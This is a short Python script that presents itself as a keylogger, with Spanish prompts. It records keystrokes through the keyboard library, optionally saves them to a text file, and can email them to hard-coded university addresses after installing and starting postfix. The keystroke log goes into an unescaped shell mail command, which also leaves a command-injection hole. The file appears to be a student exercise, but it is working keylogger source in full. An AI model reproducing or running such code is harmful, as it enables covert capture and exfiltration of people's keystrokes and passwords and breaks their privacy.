import keyboard
import subprocess

registros = []

def callback(event):
    registros.append(event.name)

def output(text):
    with open('output.txt', 'a') as f:
        f.write(text)

def send_email(sender_email, receiver_email, mensaje):
    command = f"echo '{mensaje}' | mail -s 'Registros de Keylogger' -r {sender_email} {receiver_email}"
    subprocess.run(command, shell=True)

def install_postfix():
    subprocess.run(["apt", "install", "postfix", "-y"])

def start_postfix():
    subprocess.run(["systemctl", "start", "postfix"])

def stop_postfix():
    subprocess.run(["systemctl", "stop", "postfix"])

def main():
    print("---------------------------------")
    print("---------- KeyLogger ------------")
    print("---------------------------------")
    
    respuesta_email = input("¿Deseas enviar los registros por email? (yes/no): ")
    respuesta_guardar = input("¿Deseas guardar los registros en texto plano? (yes/no): ")
        
    if respuesta_email.lower() in ['no', 'n'] and respuesta_guardar.lower() in ['no', 'n']:
        print("Interrumpiendo la ejecución del programa...")
        return
    
    keyboard.on_release(callback)
    
    while True:
        if input() == 'exit':
            print("Terminando la ejecución del programa...")
            break
            
    keyboard.unhook_all()
    
    registro = "\n".join(registros)
    
    print(registro)
    
    if respuesta_email.lower() in ['yes', 'y']:
        sender_email = "janet1204@ciencias.unam.mx"
        receiver_email = "Paola_VB@ciencias.unam.mx"
        
        install_postfix()
        start_postfix()
        
        send_email(sender_email, receiver_email, registro)
        
        stop_postfix()
        
    if respuesta_guardar.lower() in ['yes', 'y']:
        output(registro)

if __name__ == "__main__":
    main()

